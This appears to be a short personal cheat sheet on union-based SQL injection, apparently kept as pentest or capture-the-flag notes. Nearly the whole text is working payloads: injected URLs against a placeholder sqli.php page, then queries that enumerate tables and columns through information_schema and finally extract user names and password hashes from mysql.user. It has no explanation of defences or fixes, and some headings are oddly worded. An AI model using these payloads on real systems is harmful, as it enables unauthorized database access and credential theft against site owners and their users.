## Union Based SQLi

From fixing method: -1 UNION SELECT 1,2,3,4,5,6,7; -- -


or

Form value exceeding method: 

http://example.com/sqli.php?cod=100(returns nothing or query doesnt exists then) UNION SELECT 1,2,3,4,5,6,7;-- -

or

http://example.com/sqli.php?cod=1' UNION SELECT 1; -- -

or

http://example.com/sqli.php?cod=1' UNION SELECT 1; --+

or

http://example.com/sqli.php?cod=1' UNION ALL SELECT 1; --+

### Fetching the table names:

UNION SELECT 1,2,3,4,group_concat(table_name),6,7 from information_schema.tables where table_schema=database();-- -

### Fetching columns from tables.
UNION SELECT 1,2,3,4,group_concat(column_name),6,7 from information_schema.columns where table_name = 'room';-- -


#### For fetching user  and password from database 

Database: mysql
Table: user

UNION SELECT 1,2,3,4,group_concat(table_name),6,7 from information_schema.tables where table_schema='mysql';-- -

Finally,

UNION SELECT 1, user,3, 4,password, 6, 7 from mysql.user;-- -